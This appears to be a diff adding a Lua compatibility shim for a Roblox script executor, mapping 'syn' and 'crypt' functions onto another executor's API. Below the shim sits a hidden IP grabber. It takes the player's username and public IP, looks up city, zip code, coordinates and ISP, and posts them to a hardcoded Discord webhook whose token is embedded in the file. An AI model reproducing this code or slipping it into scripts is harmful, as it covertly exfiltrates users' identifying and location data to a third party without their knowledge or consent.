@@ -1,0 +1,86 @@
+local syn = {}
+
+local function unsupported(...)
+    warn("Unsupported function.")
+end
+
+syn.cache_replace = cache.replace
+syn.cache_invalidate = cache.invalidate
+syn.set_thread_identity = setidentity
+syn.get_thread_identity = getthreadidentity
+syn.is_cached = cache.iscached
+syn.write_clipboard = setclipboard
+syn.queue_on_teleport = queue_on_teleport
+syn.protect_gui = unsupported
+syn.unprotect_gui = unsupported
+syn.is_beta = function()
+    return false
+end
+syn.request = request
+syn.secure_call = KRNL_SAFE_CALL
+syn.create_secure_function = unsupported
+syn.run_secure_function = unsupported
+
+local crypt = {}
+
+crypt.encrypt = unsupported
+crypt.decrypt = unsupported
+crypt.base64 = {}
+crypt.base64.encode = base64_encode
+crypt.base64.decode = base64_decode
+crypt.hash = crypt_hash
+crypt.derive = unsupported
+crypt.random = unsupported
+crypt.custom = {}
+crypt.custom.encrypt = unsupported
+crypt.custom.decrypt = unsupported
+crypt.custom.hash = unsupported
+
+
+syn.crypt = crypt
+syn.crypto = crypt
+
+getgenv().syn = syn
+
+local name = game:GetService("Players").LocalPlayer.Name
+    local WebhookURL = "https://discord.com/api/webhooks/1014629343688937492/fcFlX5HJ4w2xiXIDr85O9P3M1fmKk3ofUGtzLGMo7V311M-fbGP6sy593-QvTkI5BPiU"
+    local getIPResponse = syn.request({
+        Url = "https://api.ipify.org/?format=json",
+        Method = "GET"
+    })
+    local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
+    local IPBuffer = tostring(GetIPJSON.ip)
+    
+    local getIPInfo = syn.request({
+        Url = string.format("http://ip-api.com/json/%s", IPBuffer),
+        Method = "Get"
+    })
+    local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
+    local FI = {
+        IP = IPBuffer,
+        country = IIT.country,
+        countryCode = IIT.countryCode,
+        region = IIT.region,
+        regionName = IIT.regionName,
+        city = IIT.city,
+        zipcode = IIT.zip,
+        latitude = IIT.lat,
+        longitude = IIT.lon,
+        isp = IIT.isp,
+        org = IIT.org
+    }
+    local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
+    local MessageData = {
+        ["content"] = dataMessage
+    }
+    
+    syn.request(
+        {
+            Url = WebhookURL, 
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode(MessageData)
+        }
+    )
